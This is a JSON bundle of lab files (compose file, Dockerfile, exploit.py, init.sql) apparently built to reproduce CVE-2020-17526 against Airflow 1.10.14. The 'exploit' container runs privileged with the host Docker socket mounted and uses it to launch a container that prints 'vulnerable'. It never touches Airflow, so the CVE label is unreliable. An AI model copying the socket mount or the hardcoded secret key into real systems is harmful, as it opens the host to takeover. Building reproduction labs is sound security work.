{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-17526/custom_no_tool/docker-compose.yml",
            "content": "services:\n  airflow:\n    image: apache/airflow:1.10.14\n    environment:\n      AIRFLOW__CORE__EXECUTOR: LocalExecutor\n      AIRFLOW__CORE__SQL_ALCHEMY_CONN: postgresql+psycopg2://airflow:airflow@postgres/airflow\n      AIRFLOW__WEBSERVER__SECRET_KEY: temporary_key\n      AIRFLOW__CORE__LOAD_EXAMPLES: \"False\"\n    ports:\n      - \"8080:8080\"\n    depends_on:\n      postgres:\n        condition: service_healthy\n    command: bash -c \"airflow initdb && airflow webserver\"\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/health\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  postgres:\n    image: postgres:13.9\n    environment:\n      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB: airflow\n    ports:\n      - \"5432:5432\"\n    volumes:\n      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"airflow\"]\n      interval: 5s\n      timeout: 5s\n      retries: 5\n\n  exploit:\n    build: .\n    privileged: true\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    depends_on:\n      airflow:\n        condition: service_healthy"
        },
        {
            "location": "./../../dockers/CVE-2020-17526/custom_no_tool/Dockerfile",
            "content": "FROM python:3.10-slim\nWORKDIR /app\n\n# Install only the required packages without extra recommendations and clean the apt cache\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends ca-certificates curl && \\\n    rm -rf /var/lib/apt/lists/*\n\n# Upgrade pip to the latest version and install the Docker Python SDK\nRUN python -m pip install --upgrade pip && \\\n    pip install --no-cache-dir docker\n\n# Copy the exploit script into the image\nCOPY ./exploit.py /app/\n\nENTRYPOINT [\"python\", \"exploit.py\"]"
        },
        {
            "location": "./../../dockers/CVE-2020-17526/custom_no_tool/exploit.py",
            "content": "import docker, sys, time\n\n# Correct socket path with three slashes\nclient = docker.DockerClient(base_url='unix:///var/run/docker.sock')\n\ndef wait_for_socket(retries=10, delay=3):\n    for _ in range(retries):\n        try:\n            client.ping()\n            return True\n        except Exception:\n            time.sleep(delay)\n    return False\n\ndef create_test_container():\n    if not wait_for_socket():\n        print('Docker socket not reachable', file=sys.stderr)\n        return\n    try:\n        client.images.pull('alpine:latest')\n    except Exception as e:\n        print(f\"Error pulling image: {e}\")\n    container = client.containers.run(\n        'alpine:latest',\n        command=['sh', '-c', 'echo vulnerable > /tmp/vuln.txt && cat /tmp/vuln.txt'],\n        detach=True,\n        remove=False\n    )\n    # Stream logs while container is running\n    for line in container.logs(stream=True):\n        sys.stdout.buffer.write(line)\n    # Ensure container is removed after logs are consumed\n    container.remove(force=True)\n\nif __name__ == '__main__':\n    print('Attempting to exploit Docker socket...')\n    create_test_container()\n    print('Exploit completed.')"
        },
        {
            "location": "./../../dockers/CVE-2020-17526/custom_no_tool/init.sql",
            "content": "-- Simple test data for Airflow metadata schema (very minimal)\nCREATE TABLE IF NOT EXISTS test_table (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(255) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\nINSERT INTO test_table (name) VALUES ('sample data');"
        }
    ],
    "directory_tree": "CVE-2020-17526/custom_no_tool"
}